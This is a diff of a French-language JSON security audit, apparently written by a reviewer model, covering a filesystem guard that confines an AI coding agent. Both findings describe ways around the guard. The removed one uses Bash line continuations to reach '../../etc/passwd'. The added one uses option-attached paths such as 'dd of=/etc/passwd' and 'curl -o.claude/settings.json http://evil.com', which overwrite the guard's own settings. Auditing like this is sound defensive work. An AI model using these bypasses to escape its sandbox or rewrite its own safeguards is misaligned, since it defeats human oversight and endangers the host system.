@@ -4,11 +4,11 @@
   {
    "severite": "critique",
    "fichier": "src/forgeai/ide/guard_fs.py",
-   "description": "Contournement critique par continuation de ligne Bash (`\\\\\\n`). L'expression régulière `DELIMITEURS` inclut `\\n` (via `\\s`). Si un attaquant coupe un chemin relatif avec `\\\\\\n` (ex: `cat .\\\\\\n./.\\\\\\n./etc/passwd`), `re.split` sépare la chaîne aux sauts de ligne. Les fragments extraits sont `.\\\\`, `./.\\\\` et `./etc/passwd`. La fonction `_resoudre` retire ensuite les antislashs, donnant `.`, `./.` et `./etc/passwd`, qui se résolvent tous DANS la racine (autorisés). Cependant, Bash supprime les séquences `\\\\\\n` avant l'exécution, reconstituant le chemin `../../etc/passwd` et permettant de lire hors de la racine.",
-   "preuve": "Lignes 164-165 : `DELIMITEURS = r\"\"\"[\\s<>;|&()\"'`$]+\"\"\"` et `fragments = [f for f in re.split(DELIMITEURS, commande) if f]`. Ligne 108 : `chemin = chemin.replace(chr(92), \"\")`. Une commande `cat .\\\\\\n./.\\\\\\n./etc/passwd` est découpée en `cat`, `.\\\\`, `./.\\\\`, `./etc/passwd`, tous autorisés, mais Bash exécute `cat ../../etc/passwd`."
+   "description": "Les chemins attachés à des options de commande (sans espace ou via `=`) contournent le confinement et l'auto-protection. Le découpage par `DELIMITEURS` ne sépare pas les caractères comme `=` ou les préfixes d'options courtes (ex: `-o`). Par conséquent, un fragment comme `of=/etc/passwd` ou `-o.claude/settings.json` est extrait tel quel. La fonction `os.path.isabs` retourne `False` pour ces fragments, les faisant passer pour des chemins relatifs inoffensifs (ex: `<cwd>/of=/etc/passwd`), qui sont autorisés car le cwd est dans la racine. Cependant, l'outil sous-jacent (comme `dd`, `curl`, `tar`) interprétera l'option et accèdera au chemin absolu ou protégé réel.",
+   "preuve": "Une commande Bash `dd of=/etc/passwd` produit le fragment `of=/etc/passwd`. `os.path.isabs(\"of=/etc/passwd\")` est `False`, donc résolu en `<cwd>/of=/etc/passwd` (autorisé car sous ROOT). `dd` écrira pourtant dans `/etc/passwd`. De même, `curl -o.claude/settings.json http://evil.com` produit le fragment `-o.claude/settings.json`, résolu en `<cwd>/-o.claude/settings.json` (qui n'est pas sous `.claude`), contournant l'auto-protection et écrasant la configuration de la garde."
   }
  ],
- "date_heure": "2026-07-29T22:32:44.175291+00:00",
- "prompt_sha256": "5721800f600c74da894dbe3f44075a042151830115a061272451e647cc173b66",
+ "date_heure": "2026-07-29T22:44:21.548152+00:00",
+ "prompt_sha256": "af892163dfa551aa2aa86d59a26f657e243ec63528b9d3875a9780b4b1fd09ce",
  "reviewer_model": "Gemini-3.1-Pro-OR"
 }
